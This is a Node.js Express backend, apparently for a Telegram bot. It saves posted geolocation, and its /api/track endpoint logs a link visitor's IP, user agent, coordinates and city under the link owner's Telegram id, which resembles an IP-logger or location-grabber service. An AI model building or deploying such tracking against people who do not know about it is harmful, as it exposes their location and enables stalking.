// api/index.js
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const mongoose = require('mongoose');

const app = express();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Static files
app.use(express.static(path.join(__dirname, '../public')));

// ===== DEBUG ENV =====
console.log('DEBUG MONGODB_URI present:', !!process.env.MONGODB_URI);

// ===== MONGODB CONNECTION =====
let Location;
let Click;             // tracker model
let connectPromise = null;

if (process.env.MONGODB_URI) {
  // Single shared connect promise
  connectPromise = mongoose
    .connect(process.env.MONGODB_URI)
    .then(() => {
      console.log('✅ MongoDB Connected');
      return true;
    })
    .catch(err => {
      console.error('❌ MongoDB Error (connect):', err);
      throw err;
    });

  // Existing location schema (old flow)
  const locationSchema = new mongoose.Schema({
    lat: String,
    lon: String,
    accuracy: String,
    email: String,
    timestamp: { type: Date, default: Date.now }
  });

  Location = mongoose.model('Location', locationSchema);

  // ==============================
  // Tracker schema (locations collection)
  // ==============================
  const clickSchema = new mongoose.Schema(
    {
      owner_id: String,   // Telegram chat id
      ip: String,
      ua: String,
      lat: Number,
      lon: Number,
      country: String,
      city: String,
      path: String,
      ts: { type: Date, default: Date.now }
    },
    { collection: 'locations' } // same collection name jo bot use kar raha hai
  );

  Click = mongoose.models.Click || mongoose.model('Click', clickSchema);

  // =======================================
  // EXISTING: LOCATION ENDPOINT (Mongo mode)
  // =======================================
  app.post('/api/location', async (req, res) => {
    try {
      if (connectPromise) {
        await connectPromise;
      }

      const { lat, lon, accuracy, email } = req.body;
      console.log('📍 Location received (Mongo mode):', {
        lat,
        lon,
        accuracy,
        email
      });

      const newLocation = new Location({
        lat,
        lon,
        accuracy,
        email: email || 'anonymous'
      });

      const saved = await newLocation.save();
      console.log('✅ Location saved to MongoDB with _id:', saved._id);

      res.json({
        status: 'success',
        message: 'Location saved successfully',
        data: { lat, lon, accuracy, email }
      });
    } catch (err) {
      console.error('❌ Error (Mongo mode):', err);
      res.status(500).json({ status: 'error', error: err.message });
    }
  });

  // =======================================
  // NEW: TRACK ENDPOINT (for Telegram bot)
  // =======================================
  app.get('/api/track', async (req, res) => {
    try {
      if (connectPromise) {
        await connectPromise;
      }

      const { uid } = req.query; // Telegram user chat id
      if (!uid) {
        return res.status(400).json({ error: 'uid query param required' });
      }

      const ip =
        (req.headers['x-forwarded-for'] &&
          req.headers['x-forwarded-for'].split(',')[0].trim()) ||
        req.socket?.remoteAddress ||
        'unknown';

      const ua = req.headers['user-agent'] || 'unknown';

      // Optional: frontend se lat/lon/country/city query ya body se bhej
      const { lat, lon, country, city, accuracy } = req.query;

      const doc = new Click({
        owner_id: String(uid),
        ip,
        ua,
        lat: lat ? Number(lat) : undefined,
        lon: lon ? Number(lon) : undefined,
        country: country || undefined,
        city: city || undefined,
        path: req.url,
        // accuracy agar chahiye to store karo:
        // accuracy: accuracy ? Number(accuracy) : undefined,
      });

      await doc.save();

      console.log('✅ Tracker hit saved for owner_id:', uid);

      return res.status(200).json({ ok: true });
    } catch (err) {
      console.error('❌ Error in /api/track:', err);
      return res.status(500).json({ error: 'Internal error' });
    }
  });
} else {
  // LOCATION ENDPOINT (No DB mode)
  app.post('/api/location', (req, res) => {
    try {
      const { lat, lon, accuracy, email } = req.body;
      console.log('📍 Location received (NO DB mode):', {
        lat,
        lon,
        accuracy,
        email
      });

      res.json({
        status: 'success',
        message: 'Location received (Local mode - no DB)',
        data: { lat, lon, accuracy, email }
      });
    } catch (err) {
      console.error('❌ Error (NO DB mode):', err);
      res.status(500).json({ status: 'error', error: err.message });
    }
  });
}

// Debug test route
app.get('/test-insert', async (req, res) => {
  try {
    if (!Location) {
      return res.status(500).json({
        status: 'error',
        error: 'Location model not initialized (no MONGODB_URI)'
      });
    }

    if (connectPromise) {
      await connectPromise;
    }

    const doc = await Location.create({
      lat: '11.11',
      lon: '22.22',
      accuracy: '5',
      email: 'test-from-route@example.com'
    });

    console.log('✅ Test doc inserted:', doc._id);
    res.json({ status: 'ok', id: doc._id });
  } catch (err) {
    console.error('❌ Test-insert error:', err);
    res.status(500).json({ status: 'error', error: err.message });
  }
});

// Root route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public', 'index.html'));
});

// Export for server.js / Vercel
module.exports = app;
